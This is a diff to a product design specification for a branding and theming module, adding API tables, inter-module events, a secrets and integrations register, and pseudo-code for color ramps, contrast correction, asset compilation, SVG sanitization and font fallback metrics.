@@ -487,8 +487,8 @@ Triggered by `Publish`. Content:
 2. **Audit results**: Contrast (pass / warnings / blocking), Fonts (licence acknowledged ✓), Assets
    (all processed ✓), Performance budgets (e.g. "Fonts 148 KB > 120 KB budget — page may load slower
    on mobile" — warning, not blocking), Custom CSS guardrail check (pass/fail), Missing translations.
-3. **Affected surfaces** with checkboxes? — **No** [D]: a release always applies to all surfaces
-   (atomic); per-surface staged rollout is out of scope v1 (avoids mixed-brand states).
+3. **Affected surfaces** — read-only list (no per-surface checkboxes) [D]: a release always applies to
+   all surfaces atomically; per-surface staged rollout is out of scope v1 (avoids mixed-brand states).
 4. **Native apps note**: "Colors, fonts, copy will update in the app on next launch. App icon/name
    changes need a new app version (submitted separately)."
 5. When: `Publish now` · `Schedule` (date/time in business timezone; e.g. rebrand launch at midnight).
@@ -2157,3 +2157,759 @@ Notes on the catalog:
   overrides or custom CSS (custom CSS re-declaring a locked var is stripped).
 - Token count (resolved, both modes): ≈ 650 color values + ≈ 180 non-color tokens. Each surface's
   compiled CSS includes only tokens its components reference (tree-shaken).
+
+---
+
+## 8. API surface
+
+Transport-agnostic commands/queries (REST/RPC/GraphQL decided in Stage 2). All mutating commands
+require an `Idempotency-Key`; tenant from auth context; permission keys from §2.2. All `[D]`.
+
+### 8.1 Brand editing (CRM, auth: staff session)
+
+| Name | Input | Output | Permission |
+|---|---|---|---|
+| `brand.getKit` | `{}` | `{kit, draft, live: BrandRelease (summary), scheduled[], audit: ContrastReport, health}` | `settings.brand.view` |
+| `brand.patchDraft` | `{expectedRevision, sectionRevisions?, ops: PatchOp[]}` (ops: `set`/`unset` on ThemeDocument JSON pointers) | `{revision, derivedChanges: {path, light?, dark?}[], auditDelta}` or `409 {currentRevision, conflictingSections}` | `edit_draft` (copy ops: `copy.edit`; workspace ops: `crm_workspace.edit`) |
+| `brand.discardDraft` | `{expectedRevision}` | `{revision}` (draft reset to live) | `edit_draft` |
+| `brand.resetToDefaults` | `{sections[]}` | `{revision}` | `edit_draft` |
+| `brand.deriveSuggestions` | `{seeds}` (stateless) | `{palettes, semantic (both modes), audit}` — used for instant preview before patch | `view` |
+| `brand.contrast.check` | `{pairs: {fg, bg}[]}` or `{tokenPaths[]}` | ratios + suggestions | `view` |
+| `brand.contrast.fix` | `{pairIds[] | 'all'}` | `{ops applied, revision}` | `edit_draft` |
+| `brand.import.fromWebsite` | `{url}` | `{jobId}` → poll `brand.import.get` → `{logos[], colors[], fonts[], favicon}` | `edit_draft` |
+| `brand.publish` | `{expectedRevision, scheduleAt?, note?, name?, contrastOverride?: {typedConfirmation}}` | `{releaseId, version, status}` | `publish` |
+| `brand.release.list` / `.get` / `.diff` | `{cursor}` / `{version}` / `{fromVersion, toVersion}` | releases / release / semantic diff | `view` |
+| `brand.release.rollback` | `{toVersion, note?}` | `{releaseId, version}` | `publish` |
+| `brand.release.cancelSchedule` / `.reschedule` | `{version, scheduleAt?}` | release | `publish` |
+| `brand.release.pin` | `{version, name}` | release | `publish` |
+| `brand.preview.createSession` | `{target: 'draft' | {version}}` | `{previewUrl (24 h), token}` | `view` |
+| `brand.preview.createShareLink` / `.revoke` | `{target, expiresInDays ≤ 7, passcode?}` | `{url}` | `preview.share` |
+| `brand.export` / `brand.import.tokens` | `{format: 'pl' | 'dtcg'}` / `{file}` | JSON / `{diff, revision}` (draft only) | `view` / `edit_draft` |
+| `brand.customCss.save` / `.validate` / `.disable` / `.enable` | `{source, scopes}` / `{}` / `{reason}` | lint + status | `custom_css.edit` (disable also `publish`, platform support) |
+| `brand.template.save` / `.push` (hub) | `{name, locks}` / `{templateId, tenantIds}` | template / push results | `tenant.hub.manage` |
+
+### 8.2 Assets, fonts, icons
+
+| Name | Input | Output | Permission |
+|---|---|---|---|
+| `brand.asset.createUpload` | `{kind, filename, bytes, mime}` | `{assetId, uploadUrl, expiresAt, maxBytes}` | `edit_draft` (fonts: `fonts.upload`) |
+| `brand.asset.completeUpload` | `{assetId}` | `{status}` (async; event/websocket on ready) | same |
+| `brand.asset.get` / `.list` | `{id}` / `{kind, tag?, cursor}` | asset(s) with signed preview URLs | `view` |
+| `brand.asset.update` | `{id, tags?, trim?: boolean}` | asset | `edit_draft` |
+| `brand.asset.delete` | `{id}` | `204` or `409 {referencedBy: versions[]}` | `assets.delete` |
+| `brand.asset.generateDarkVariant` | `{assetId, method}` | `{assetId (generated)}` | `edit_draft` |
+| `brand.font.attestLicence` | `{attestationTextVersion, note?, url?, licenceDocAssetId?}` | `{attestationId}` | `fonts.upload` |
+| `brand.font.createFromUploads` | `{assetIds[], attestationId, familyNameOverride?}` | `FontFamily (processing)` | `fonts.upload` |
+| `brand.font.list` / `.searchCatalog` | `{source?}` / `{q, category?, script?}` | families | `view` |
+| `brand.font.addFromCatalog` | `{catalogFamily}` | `FontFamily` (platform-shared ref) | `edit_draft` |
+| `brand.font.withdraw` | `{familyId, reason}` | family | `fonts.upload` |
+| `brand.icon.sets` | `{}` | `IconSet[]` (with sample glyphs) | `view` |
+| `brand.icon.search` | `{q, set?, includeCustom}` | glyph refs | `view` |
+| `brand.icon.suggestMappings` | `{targetType}` | `{targetRef, icon, confidence}[]` | `view` |
+
+### 8.3 Copy
+
+| Name | Input | Output | Permission |
+|---|---|---|---|
+| `copy.keys.list` | `{surface?, screen?, q?, filter?, locale}` | `{key, def, default, override?, status}[]` | `view` |
+| `copy.override.set` / `.unset` | `{key, locale, text}` | `{revision, validation}` | `copy.edit` |
+| `copy.locale.add` / `.remove` / `.setDefault` | `{locale}` | `LocaleSettings` | `copy.edit` (+ plan limit) |
+| `copy.export` / `copy.import` | `{locale, format: 'csv'|'xliff'|'json'}` / `{file, locale}` | file / `{diff, errors[]}` → `copy.import.apply` | `copy.edit` |
+| `copy.translate.suggest` | `{locale, keys[] | 'missing'}` | suggestions (origin `machine_suggested`) | `copy.edit` |
+| `copy.resolve` (internal, used by renderers) | `{tenantId, releaseVersion, locale, keys[] | surface}` | `Record<key, text>` | service-to-service |
+
+### 8.4 Delivery (public / service-to-service)
+
+| Name | Input | Output | Auth |
+|---|---|---|---|
+| `GET /{assetPath}/b/{hash}.css|.woff2|.svg|.png|.webp|.avif|.json` | — | immutable artifact | public, cookieless asset origin |
+| `brand.render.headSnippet` (edge, internal) | `{tenantId, surface, modeCookie?, locale}` | `{htmlAttrs: {data-mode, lang, dir, class}, inlineCss, preloads[], links[], metaThemeColor[], manifestUrl, faviconLinks[]}` | edge internal |
+| `GET /app/theme?platform=&app=&locale=` | `If-None-Match` | `{version, manifestHash, tokens (platform-formatted), fonts[], logos{}, icons{}, copy{}}` or 304 | app session (customer or staff) |
+| `brand.emailTheme.get` | `{tenantId, releaseVersion?}` | `EmailTheme` (§10.9) | service (08) |
+| `brand.documentTheme.get` | `{tenantId, releaseVersion}` | `{printCss, fonts[{url, embeddable}], logo{vector|raster}, paper}` | service (04) |
+| `brand.paymentAppearance.get` | `{tenantId, mode}` | processor-appearance object | service (05) |
+| `brand.qrStyle.get` | `{tenantId}` | `{fg, bg, moduleStyle, centerLogoUrl?}` | service (01) |
+| `brand.calendarColors.get` | `{tenantId}` | categorical palette with fg/dark variants | service (09/03) |
+
+### 8.5 Appearance preferences
+
+| Name | Input | Output | Auth |
+|---|---|---|---|
+| `appearance.me.get` / `.update` | `{mode?, textScale?, density?, reducedMotion?, highContrast?, cvdAssist?, locale?}` | `AppearancePreference` | staff session (`self.appearance.edit`) |
+| `appearance.customer.get` / `.update` | `{mode?, locale?}` | preference | portal account session (01) |
+
+### 8.6 Native app builds (tier-gated)
+
+| Name | Input | Output | Permission |
+|---|---|---|---|
+| `apps.credentials.connect` | `{platform, kind: 'app_store_connect_api_key' | 'play_service_account', secretUpload}` | `{status, validatedAt}` (secret never returned) | Owner |
+| `apps.build.request` | `{app, platforms[], releaseNotes}` | `AppBuild[]` | Owner |
+| `apps.build.list` / `.get` | — | builds with status | `settings.brand.view` |
+
+---
+
+## 9. Interfaces with other modules
+
+### 9.1 PRODUCES — events
+
+| Event | Payload (key fields) | Consumers |
+|---|---|---|
+| `brand.release.published` | `{tenantId, version, manifestHash, changedSections[], appBuildRequired, scheduled:boolean}` | 01 (purge portal HTML, update manifest/OG), 04 (new renders use version), 08 (refresh email theme cache, regenerate template thumbnails), 09/03 (calendar palette refresh), apps config service, 10 |
+| `brand.release.rolled_back` | `{tenantId, fromVersion, toVersion, newVersion}` | same as published |
+| `brand.release.scheduled` / `.schedule_cancelled` / `.failed` | `{tenantId, version, scheduleAt?, error?}` | 08 (notify publisher), audit |
+| `brand.draft.updated` | `{tenantId, revision, sections[]}` | internal (preview sessions via realtime) |
+| `brand.asset.ready` / `.rejected` / `.quarantined` | `{tenantId, assetId, kind, reason?}` | editor UI; 01 (quarantine → edge fallback) |
+| `brand.font.ready` / `.rejected` / `.withdrawn` | `{tenantId, familyId, reason?}` | editor UI; compile (withdrawn → auto-republish) |
+| `brand.customcss.disabled` | `{tenantId, by, reason}` | 01 edge flag, audit |
+| `brand.app_build.status_changed` | `{tenantId, buildId, app, platform, status}` | 08 (notify owner), 01 (app store links on portal when released) |
+| `copy.locale.enabled` / `.disabled` | `{tenantId, locale}` | 01 (language switcher), 08 (template locales) |
+| `appearance.user.updated` | `{userId, mode, …}` | realtime → user's open sessions/apps |
+| `appearance.customer.updated` | `{portalAccountId, mode, locale}` | 01 / customer app |
+
+### 9.2 CONSUMES — events
+
+| Event | From | Reaction |
+|---|---|---|
+| `tenant.business.created` | 09 | seed Brand Kit + auto-publish v1 (§4.1) |
+| `tenant.plan.changed` | 09 | entitlement re-evaluation (§4.15) |
+| `tenant.business.profile_updated` (name change) | 09 | regenerate text-logo/monogram fallbacks, OG image (republish only if they're in use) |
+| `catalog.category.created/updated/archived`, `catalog.service.*`, `catalog.addon.*` | 02 | icon auto-suggestion for new items; drop mappings to archived items at next publish |
+| `portal.domain.activated` / `booking.domain.verified` | 01 | include host in web manifest `scope`/`start_url`, favicon links; app deep-link config for next app build |
+| `portal.config.published` | 01 | none required (independent), but preview fixtures refresh |
+| `team.member.color_changed` | 09 | validate against categorical palette; return contrast-safe fg/dark variants |
+| `notification.template.updated` | 08 | regenerate email preview thumbnails for Brand preview |
+| `document.rendered` | 04 | record `brandReleaseId` reference → retention guard (§5.14) |
+
+### 9.3 Contracts per module
+
+- **01 Booking portal** — replaces `PortalStyle.colors/fontFamily/radius/theme/logoAssetId/faviconAssetId/heroAssetId/showPoweredBy` with `brandReleaseRef` + calls `brand.render.headSnippet` at the edge; keeps `map` settings but takes pin color from `color.map.pin`; must emit `data-part` hooks and `data-copy-key` (preview only) on its components; serves `apple-app-site-association`/`assetlinks.json` from 11's app config; embed loader passes `data-mode`/host color-scheme to iframe via `postMessage`.
+- **02 Catalog** — exposes `iconRef` on category/service/add-on read models (or lets 11 own `IconMapping` keyed by 02 ids — Agent 10 to choose; 11 recommends **11 owns the mapping**, 02 stays brand-agnostic).
+- **03 Scheduling** — calendar components read `color.data.categorical.n.*`, `color.calendar.*`, `color.job-status.*` tokens; drag alternatives (2.5.7) are 03's UI behaviour but 11's accessibility rule.
+- **04 Job lifecycle/documents** — document renders call `brand.documentTheme.get(version)` and store `brandReleaseId`; 04's "Document style" layout options stay in 04; logo/accent/font in 04's settings screen become read-only links to Brand (removes duplication with `[S: 04]` §3.8 "logo (from brand settings), accent color (from brand), font (system set)").
+- **05 Payments** — payment element appearance from `brand.paymentAppearance.get`; any processor-hosted page (e.g. hosted checkout) gets logo + primary color through processor branding API at account onboarding and on each `brand.release.published` (best-effort sync).
+- **06 Subscriptions/gift cards** — gift-card designs use brand tokens + logo; "AI gift card design" [S: llms] must stay within brand palette by default (option to deviate).
+- **07 Customers** — no direct dependency; asset/vehicle type icons can use `IconMapping(asset_type)`.
+- **08 Comms** — "Brand Kit" in 08 §3.9 = this module; 08 uses `brand.emailTheme.get` + 11's inliner/dark-mode post-processor; SMS landing pages are 01-rendered with brand theme; push notification icon (Android small icon must be monochrome silhouette — generated from mark) supplied by 11.
+- **09 Team/RBAC** — registers §2.2 keys; worker calendar colors validated by 11; staff `AppearancePreference` keyed by user (cross-business).
+- **10 Integrator** — resolve conflicts listed in §9.4.
+
+### 9.4 Conflicts / decisions for Agent 10
+
+| # | Conflict | 11's proposal |
+|---|---|---|
+| C1 | 01 §7 defines `PortalStyle` (5 colors, single font, radius, theme, logos) and `textOverrides` inside `PortalConfig` | Move style + text overrides to 11's Brand release; `PortalConfig` references `brandReleaseVersion` (or always-live). 01 keeps flow/settings; 01 still owns *which portal copy keys exist* (registry entries with `ownerModule:'01'`) |
+| C2 | Two publish buttons (portal settings vs brand) | Separate publishes are fine (different concerns), but the Brand publish dialog lists "Portal settings also have unpublished changes" if 01's draft is dirty, with a link (no coupling) |
+| C3 | 04 document style (logo/accent/font) vs Brand | Brand owns visual identity; 04 owns layout/fields; 04 screen shows linked read-only brand values |
+| C4 | 08 email editor theme vs Brand | 08 consumes compiled email theme; per-email overrides (e.g. a holiday campaign color) are 08 template-level, not Brand |
+| C5 | Icon mapping storage (02 vs 11) | 11 stores `IconMapping` |
+| C6 | Portal account appearance preference storage (01 vs 11) | 11 stores `AppearancePreference(portal_account)` |
+
+### 9.5 API keys, secrets & integrations register (branding/theming-relevant)
+
+Storage classes [D]: **Platform secret** = in the platform secrets vault (KMS-backed, access-scoped to
+the service that needs it, never in code/config repos, never sent to clients). **Business secret** =
+encrypted per tenant (envelope encryption, tenant data key) in the secrets store, write-only via UI
+(never displayed again; last-4/fingerprint shown), decrypted only inside the build/sync worker.
+**Public identifier** = not secret (may appear in client code).
+
+| # | Service / integration (candidates; vendor choice Stage 2) | Purpose | Credentials | Owner | Stored | Rotation | Required? |
+|---|---|---|---|---|---|---|---|
+| K1 | Google Fonts **Developer API** (metadata list) | daily sync of family catalog (names, variants, subsets, versions) for the picker | API key (restrict to the Web Fonts Developer API, server IP restriction) | Platform | Platform secret | 180 days or on leak; key is low-sensitivity | Optional (static catalog fallback from the open-source fonts repository, no key) |
+| K2 | Font file source (Google Fonts static files / open-source repo mirror) | download font binaries once into our store | none | Platform | — | — | Yes if Google Fonts offered |
+| K3 | Adobe Fonts (Typekit) web project — *optional later* | businesses who license Adobe Fonts: reference their web project | **Project ID** (public identifier; domain-allowlisted by Adobe to the booking host) | Business | Tenant config (not secret) | n/a; business manages domain list in Adobe | Optional (v2); note: Adobe Fonts cannot be embedded in PDFs/emails by us — fallbacks used [I] |
+| K4 | Object storage (originals, quarantine, artifacts) | store assets, fonts, compiled CSS/JSON | access key/secret or workload identity (preferred: no static keys) | Platform | Platform secret / workload identity | 90 days for static keys (dual-key overlap) | Yes |
+| K5 | CDN / edge network (artifact delivery, edge KV pointer, HTML purge) | serve artifacts, purge by tag, edge function for head snippet | API token scoped to purge + KV write for the platform zone | Platform | Platform secret | 90 days; separate tokens for purge vs. config | Yes |
+| K6 | Image CDN / transformation service (if used instead of pre-generation) | on-the-fly resize/format for hero/service images | **URL-signing secret** (HMAC) + API key | Platform | Platform secret | 90 days, dual-secret verification window (old+new valid 7 days) | Optional (pre-generation at publish needs none) |
+| K7 | Malware scanning (self-hosted engine or API) | scan uploads (logos, fonts, icons, licence docs) | API key if SaaS | Platform | Platform secret | 180 days | Yes (self-hosted preferred: no data leaves) |
+| K8 | Headless browser rendering (self-hosted pool or SaaS) | PDF rendering, preview thumbnails, custom-CSS guardrail tests, website import | API key if SaaS | Platform | Platform secret | 90 days | Yes (self-hosted preferred for PII in invoices) |
+| K9 | LLM provider (AI brand import role-guessing, copy translation suggestions) | "Import from website" classification; translate missing copy | API key | Platform | Platform secret | 90 days; per-environment keys; spend limits | Optional |
+| K10 | Email rendering QA (e.g. a client-preview testing service) | CI-only screenshots of email templates across clients | API key | Platform | CI secret | 180 days | Optional (QA only, never runtime) |
+| K11 | **Apple App Store Connect API** (branded customer/team app submission) | upload builds, metadata, TestFlight, release | **Issuer ID + Key ID + `.p8` private key** created in the **business's own** Apple Developer account (App Review Guideline 4.2.6: template-generated apps must be submitted by the content provider's own account [I — verify current wording]) | **Business** | Business secret | Apple API keys don't expire; rotate on staff change/leak (revoke + new key); we alert if unused 12 months | Only for branded apps |
+| K12 | Apple **APNs** auth key (`.p8`) for the branded customer app | push notifications (08) | Key ID + Team ID + `.p8` (business's team) | Business | Business secret | on leak / staff change | Branded app with push |
+| K13 | Apple signing (distribution certificate + provisioning profiles) | sign the branded iOS binary | certificate `.p12` + password, or managed via App Store Connect API (automatic signing in CI) | Business (account) / Platform CI (process) | Business secret | certificates expire yearly → CI renews via API; alert 30 days before | Branded app |
+| K14 | Google Play **Developer API** | upload `.aab`, listing, release tracks | service-account JSON key in the **business's** Play Console (or Play's managed publishing invite to our service account — preferred, avoids key export) | Business | Business secret (if JSON) | 90 days recommended; prefer keyless invite | Branded Android app |
+| K15 | Android app signing key / upload key | sign `.aab` (Play App Signing holds the app key; we hold the upload key) | upload keystore + passwords | Platform CI per tenant (generated) | Business secret | upload key reset possible via Play support if lost | Branded Android app |
+| K16 | Firebase Cloud Messaging (Android push for branded app) | push | service-account credentials in business's Firebase project (or platform project per app) | Business or Platform (decide §13) | Business/Platform secret | 90 days | Branded app with push |
+| K17 | Platform desktop app code signing | sign/notarize the (platform-branded) desktop app | Apple Developer ID cert + notarization API key; Windows code-signing certificate (cloud HSM-backed signing service) | Platform | Platform secret / HSM | per certificate expiry (1–3 yr); HSM keys non-exportable | Desktop app |
+| K18 | Platform iPhone team app & customer-hub app (non-branded) | submit platform apps | App Store Connect API key (platform account), Play service account (platform) | Platform | Platform secret | as K11/K14 | Yes (platform apps) |
+| K19 | Map provider styles (01/03 own maps) | dark/light map styles matching brand (pin color, muted style) | style IDs (public) + map API key (01's register) | Platform | per 01 | per 01 | via 01 |
+| K20 | Payment processor appearance (05) | brand logo/color on processor-hosted surfaces | uses 05's platform keys + connected account id | Platform/05 | per 05 | per 05 | via 05 |
+
+Rules: no business secret is ever readable back through any API or by support staff without break-glass
+(audited); build workers receive short-lived decrypted material in memory only; every secret has an
+owner, a rotation date and a "last used" timestamp surfaced in `Settings → Integrations` (09 owns that
+screen; 11 contributes rows K3, K11–K16).
+
+---
+
+## 10. Algorithms / pseudo-code
+
+### 10.1 Color utilities
+
+```ts
+// sRGB <-> OKLab/OKLCH per Björn Ottosson's OKLab definition [I]
+function relLum(hex): number {               // WCAG 2.x
+  const [r,g,b] = toRgb01(hex).map(c => c <= 0.04045 ? c/12.92 : ((c+0.055)/1.055) ** 2.4);
+  return 0.2126*r + 0.7152*g + 0.0722*b;
+}
+function contrast(a, b) { const [L1,L2] = [relLum(a), relLum(b)].sort((x,y)=>y-x); return (L1+0.05)/(L2+0.05); }
+
+function onColor(bg): Hex {                  // pick readable text color for a fill
+  const white = '#ffffff', ink = '#0b0d12';  // near-black ink reads softer than pure black [D]
+  return contrast(white, bg) >= contrast(ink, bg) ? white : ink;
+}
+
+function gamutMap(oklch): Hex {              // reduce chroma at constant L,h until inside sRGB
+  if (inSrgb(oklch)) return toHex(oklch);
+  let lo = 0, hi = oklch.c;
+  for (let i = 0; i < 20; i++) { const mid = (lo+hi)/2; inSrgb({...oklch, c: mid}) ? lo = mid : hi = mid; }
+  return toHex({...oklch, c: lo});
+}
+
+const STEPS = [50,100,200,300,400,500,600,700,800,900,950];
+const L_TARGET = [0.975,0.945,0.885,0.810,0.720,0.630,0.550,0.470,0.390,0.310,0.230];
+const C_FACTOR = [0.10,0.20,0.40,0.65,0.85,1.00,1.00,0.92,0.80,0.65,0.50];
+
+function ramp(seedHex, opts = {curve: 1.0, hueShift: 6, pinned: {}}): Record<Step,Hex> {
+  const s = toOklch(seedHex);
+  const anchorIdx = argmin(L_TARGET.map(l => Math.abs(l - s.l)));
+  const out = {};
+  STEPS.forEach((step, i) => {
+    if (opts.pinned[step]) { out[step] = opts.pinned[step]; return; }
+    if (i === anchorIdx)   { out[step] = seedHex; return; }        // brand fidelity
+    // blend target L with seed-relative offset so ramp passes through the seed smoothly
+    const l = L_TARGET[i] + (s.l - L_TARGET[anchorIdx]) * falloff(Math.abs(i - anchorIdx)); // falloff: 1→0 over 3 steps
+    const c = s.c * C_FACTOR[i] / C_FACTOR[anchorIdx] * opts.curve;
+    const h = s.h + opts.hueShift * (s.l - l) / 0.75 * warmFactor(s.h);   // warmFactor 0 for neutrals/cool hues
+    out[step] = gamutMap({l: clamp(l,0,1), c: Math.max(0,c), h});
+  });
+  return enforceMonotonicL(out);             // guarantees L strictly decreases 50→950 (nudges ±0.005)
+}
+```
+
+### 10.2 Contrast auto-fix (minimal perceptual change)
+
+```ts
+// Find the closest color to `fg` (same hue & chroma intent) meeting `target` against `bg`.
+function fixContrast(fg: Hex, bg: Hex, target: number, palette?: Ramp): Suggestion {
+  if (contrast(fg,bg) >= target) return {hex: fg, changed: false};
+  // 1) Prefer an existing palette step (keeps the system coherent)
+  if (palette) {
+    const passing = STEPS.map(s => palette[s]).filter(h => contrast(h,bg) >= target);
+    if (passing.length) return pick(passing, h => deltaEOK(h, fg));   // min OKLab distance
+  }
+  // 2) Otherwise move L in the direction that increases contrast, binary search
+  const o = toOklch(fg), darker = relLum(bg) > 0.18;   // light bg → darken fg
+  let lo = darker ? 0 : o.l, hi = darker ? o.l : 1;
+  for (let i = 0; i < 24; i++) {
+    const mid = (lo+hi)/2, cand = gamutMap({...o, l: mid});
+    const ok = contrast(cand,bg) >= target;
+    if (darker) ok ? lo = mid : hi = mid; else ok ? hi = mid : lo = mid;
+  }
+  const hex = gamutMap({...o, l: darker ? lo : hi});
+  return {hex, changed: true, ratio: contrast(hex,bg), deltaE: deltaEOK(hex, fg)};
+}
+// For button pairs, fixing may target the BACKGROUND instead (keep white text, darken button):
+// try both strategies (move fg / move bg) and propose the one with smaller deltaE on the brand-carrying color
+// unless the brand color is the anchor (then move the other one first).
+```
+
+`primaryButtonBg(mode)`: candidates = primary ramp steps ordered by distance from anchor; choose the
+first with `contrast(step, onColor(step)) ≥ 4.5` **and** (mode = dark ⇒ `contrast(step, canvas) ≥ 3`);
+if none, run `fixContrast` on anchor vs both white and ink and take the smaller ΔE.
+
+### 10.3 Full audit at publish
+
+```
+for mode in [light, dark]:
+  for surface in surfacesUsingTheme:
+     tokens = resolve(themeDoc, mode, surface)                 // layers 0–5
+     for pair in PAIR_CATALOG[surface]:                        // §5.3 table expanded (~120 pairs)
+        r = contrast(composite(tokens[pair.fg], tokens[pair.bg]), tokens[pair.bg])
+        record(pair, r, severity(pair, r))
+  for each worker color in categorical palette: check chip text (both modes)
+  heroText: sample image under text box (downscaled 64×), take 95th-pct worst luminance, apply scrim, check
+checkFonts(): every referenced family ready + attested; weights present
+checkAssets(): all refs ready, not quarantined; required placements (web header, favicon) present or fallback
+checkBudgets(): compile dry-run sizes
+checkCopy(): ICU parse, placeholders, locked phrases, missing locales → warnings
+customCss: lint (AST) → guard test happens during compile (§10.4)
+```
+
+### 10.4 Compile pipeline (per release)
+
+```
+inputs: snapshot S (ThemeDocument, copy, asset refs, fonts, custom CSS), compilerVersion
+1. resolved = resolveAll(S)               // both modes, all surfaces → ResolvedTokens
+2. per web surface W in {booking, account, tracking, sms_page, embed}:
+     vars_light = cssVars(resolved.light, usedTokens(W)); vars_dark = cssVars(resolved.dark, usedTokens(W))
+     critical = minify(`
+        :root{color-scheme:light dark}
+        :root,[data-mode=light]{${vars_light}}
+        [data-mode=dark]{${vars_dark}; color-scheme:dark}
+        @media (prefers-color-scheme:dark){[data-mode=system]{${vars_dark}; color-scheme:dark}}
+        @media (prefers-contrast:more){ … high-contrast deltas … }
+        html{background:var(--pl-color-bg-canvas);color:var(--pl-color-fg-default)}`)   // ≤ 4 KB
+     tenantCss = fontFaces(S.fonts, subsets) + fallbackFaces(metrics) + logoRules + iconSprite ref
+     guard: assert bytes(critical) ≤ 4096 else drop unused component tokens / fail
+3. workspace CSS (crm/team web) analogously with workspace density and CRM theme scope
+4. email theme (§10.9), print CSS (§10.10)
+5. native token bundles (§10.11), payment appearance (§10.12)
+6. logos: for each placement → derivative set (svg passthrough sanitized; png/webp/avif @1x/2x/3x; email png @2x;
+   favicon ico(16,32,48) + png180 + svg(with dark media query) ; pwa 192/512/maskable512; app icons; og 1200×630)
+7. icon sprite: only glyphs referenced by mappings + platform UI glyph set for surface
+8. copy bundles: per surface × enabled locale (only overridden keys) + ICU precompiled
+9. custom CSS: parse → validate → re-serialize → wrap `@layer tenant{…}` + reduced-motion wrapper → guard test
+   (headless render 6 pages × 2 viewports × 2 modes) → include or exclude
+10. hash every artifact (sha256, base32 first 16 chars in URL), upload (skip if exists), write manifest
+11. head snippet template per surface stored in manifest (preload links, favicon links, theme-color metas)
+```
+
+### 10.5 No-flash-of-wrong-theme (web)
+
+```
+Edge (per request to an HTML page):
+  ptr = KV.get(`tenant:${id}:brand`)                         // cached at edge
+  pref = cookie.pl_mode ?? (session.prefs?.mode) ?? ptr.defaultMode   // 'light'|'dark'|'system'
+  rewrite <html> → data-mode="${pref}" lang dir
+  inject in <head> before any stylesheet:
+     <meta name="color-scheme" content="light dark">
+     <meta name="theme-color" media="(prefers-color-scheme: light)" content="{bg.header light}">
+     <meta name="theme-color" media="(prefers-color-scheme: dark)"  content="{bg.header dark}">
+     <style nonce=…>{critical}</style>                       // both palettes; 'system' resolved by CSS media query
+     <link rel=preload as=font type=font/woff2 crossorigin href=…>  (≤ 2)
+     <link rel=stylesheet href=tenantCss> <link rel=stylesheet href=platformCss> [<link custom css>]
+Result: correct colors on first paint with zero JS. JS only needed when the user toggles (sets attribute + cookie).
+Optional client hint: respond `Accept-CH: Sec-CH-Prefers-Color-Scheme` so the server can also pick
+theme-color/logo `<img>` variants; not required because logos use <picture> with media queries:
+  <picture><source srcset=logo-dark.svg media="(prefers-color-scheme: dark)"> <img src=logo-light.svg …></picture>
+  and for explicit data-mode overrides, both <img> are rendered and toggled by CSS ([data-mode=dark] .logo-light{display:none}).
+```
+
+### 10.6 Logo processing & dark-variant suggestion
+
+```
+analyze(asset):
+  if svg: rasterize at 1024 for analysis
+  alphaBox = trim(transparentPixels) ; solidBgBox = trim(edgeColorFlood, tolerance ΔE<2) if no alpha
+  meanL = mean luminance of opaque pixels; colors = kmeans(OKLab, k=5, opaque only)
+  isSingleColor = colors[0].weight ≥ 0.9
+suggestDark(asset):
+  if contrast(meanColor, darkCanvas) ≥ 3 → 'none' (works as is)
+  else if isSingleColor → 'recolor_white' (svg: replace fill; raster: alpha-mask × white)
+  else if svg and colors all low-chroma → 'invert_lightness' (OKLCH L' = 1 − L per fill)
+  else → 'plate' (place on light rounded plate token color, padding 8–12%)
+opticalSize(aspect, placement):
+  h = clamp(placement.hMin, placement.hBase × aspect^-0.35, placement.hMax); w = min(h × aspect, placement.wMax)
+appIcon(mark, bgToken):
+  canvas 1024² solid bg (no alpha for iOS); mark fit inside 62% box centered (iOS rounded-rect mask safe)
+  android adaptive: fg layer 432×432 px (108dp@4x) mark inside central 264 px (66dp) circle; bg layer solid
+  monochrome layer: mark silhouette (alpha → white)
+favicon(mark): render at 16/32/48 with hinting-friendly padding (0–12% by safeArea), ICO pack; SVG keeps
+  <style>@media (prefers-color-scheme: dark){…}</style> when dark mark exists
+```
+
+### 10.7 SVG sanitization (logos & icons)
+
+```
+parse with a non-validating XML parser with: DTD/ENTITY processing DISABLED (no XXE / billion laughs),
+  max depth 64, max nodes 20,000, max attribute length 64 KB
+reject if root ≠ <svg> or file contains <!DOCTYPE … [ (internal subset) or processing instructions
+walk tree; ALLOW elements: svg g path rect circle ellipse line polyline polygon defs symbol use(href^="#")
+  linearGradient radialGradient stop clipPath mask pattern(no external) title desc text tspan (warn: fonts)
+  image (ONLY data:image/png|jpeg|webp base64, ≤ 256 KB decoded, re-encoded after decode)
+DROP elements: script foreignObject iframe embed object animate animateMotion animateTransform set
+  style (parsed separately: keep only declarations from SVG presentation-property allowlist, no @import, no url()
+  except url(#localId)) a (unwrap children) audio video metadata (strip) any namespaced non-SVG element
+ATTRIBUTES: allowlist of presentation/geometry attrs; DROP on*, href/xlink:href not starting with '#',
+  any value containing 'javascript:' 'data:' (except allowed image), 'url(' not 'url(#', 'expression(';
+  remove id collisions by prefixing ids with asset hash (prevents clashing when inlined in sprites)
+re-serialize (canonical), optimize (path precision 2, remove metadata/editor namespaces), store sanitized only
+serve: from cookieless asset origin; headers: Content-Type image/svg+xml; X-Content-Type-Options: nosniff;
+  Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'; img-src data:; sandbox
+inline use (icons): only the sanitized, re-serialized output; inserted as DOM from a trusted template, never innerHTML of raw upload
+```
+
+### 10.8 Font fallback metrics (CLS avoidance)
+
+```
+given web font F metrics (unitsPerEm U, ascent A, descent D (positive), lineGap G, avgWidth W_F)
+and local fallback L metrics (U_L, W_L) from a bundled table (Arial, Helvetica Neue, Times New Roman, Georgia, Roboto…)
+avgWidth measured on a representative string weighted by English letter frequency (or xAvgCharWidth if no glyph data)
+sizeAdjust      = (W_F / U) / (W_L / U_L)                     // match average advance width
+ascentOverride  = A / (U × sizeAdjust)
+descentOverride = D / (U × sizeAdjust)
+lineGapOverride = G / (U × sizeAdjust)
+emit:
+@font-face { font-family:"pl-body-fallback"; src: local("Arial"), local("ArialMT");
+  size-adjust:{sizeAdjust%}; ascent-override:{…%}; descent-override:{…%}; line-gap-override:{…%}; }
+font-family: "pl-body", "pl-body-fallback", system-ui, …;
+Browsers lacking some descriptors simply ignore them (graceful) [I: Safari support for the override
+descriptors lags Chromium/Firefox — verify at build time].
+choose fallback L with category match and highest platform availability (Arial on Windows/macOS; Roboto on Android via local())
+```
+
+### 10.9 Email theme compile + dark-mode post-processing
+
+```
+EmailTheme = {
